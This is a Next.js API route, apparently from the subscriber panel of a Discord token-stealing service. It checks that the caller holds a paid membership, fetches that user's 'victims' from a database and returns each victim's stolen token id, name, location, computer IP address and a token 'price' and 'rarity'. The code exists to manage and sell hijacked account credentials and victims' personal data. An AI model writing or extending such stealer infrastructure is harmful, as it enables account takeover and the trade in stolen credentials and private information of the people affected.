import type { NextApiRequest, NextApiResponse } from 'next';
import { getAllVictims, mongo } from '@/server';
import { getSession } from 'next-auth/react';
import type { User } from '@/interfaces';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  try {
    const session = await getSession({ req });
    const user = session?.user as User | undefined;
    if (!user) throw Error('User is not logged in.');
    if (!user?.subscription?.key && !user.isAdmin)
      throw Error('You do not have a paid membership to perform this action!');
    const db = await mongo();
    const { data: victims, count } = await getAllVictims(db, user.id);

    if (!victims || count < 1) throw Error("You don't have any victim!");

    const data = victims.map((victim) => {
      if (!victim.tokens.length || !victim.tokens[0]?.id) return;
      return {
        id: victim.tokens[0].id,
        name: victim.name,
        icon: victim.icon || 'https://cdn.discordapp.com/embed/avatars/0.png',
        location: victim.location,
        ip: victim.computer.ip,
        price: victim.tokens[0].price,
        rarity: victim.tokens[0].rarity,
        badges: victim.tokens[0].badges
      };
    });

    res.status(200).json(data);
  } catch (err: any) {
    res.status(500).json({
      statusCode: 500,
      message: err.message
    });
  }
}
